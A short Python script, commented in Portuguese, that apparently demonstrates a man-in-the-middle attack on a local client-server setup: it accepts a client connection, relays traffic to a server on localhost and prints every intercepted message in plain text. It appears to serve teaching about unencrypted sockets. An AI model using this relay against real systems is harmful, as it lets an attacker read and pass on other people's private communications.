import socket

def mitm():
    """Interceptador de comunicação entre cliente e servidor"""
    hacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    hacker_socket.bind(("0.0.0.0", 5556))  # Porta alternativa para escutar
    hacker_socket.listen(1)
    
    print(" Hacker aguardando conexão do cliente...")
    
    client_conn, client_addr = hacker_socket.accept()
    print(f" Cliente conectado: {client_addr}")
    
    # Agora, vamos conectar ao servidor como se fôssemos o cliente
    server_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_conn.connect(("127.0.0.1", 5555))  # Conectar ao servidor real
    print(" Conectado ao servidor!")

    while True:
        # Intercepta mensagem do cliente
        client_message = client_conn.recv(1024)
        if not client_message:
            break
        print(f" Mensagem interceptada do CLIENTE: {client_message.decode()}")  # Texto bruto

        # Encaminha ao servidor
        server_conn.send(client_message)

        # Intercepta resposta do servidor
        server_message = server_conn.recv(1024)
        if not server_message:
            break
        print(f" Mensagem interceptada do SERVIDOR: {server_message.decode()}")  # Texto bruto

        # Encaminha de volta ao cliente
        client_conn.send(server_message)

    client_conn.close()
    server_conn.close()
    hacker_socket.close()

if __name__ == "__main__":
    mitm()
 
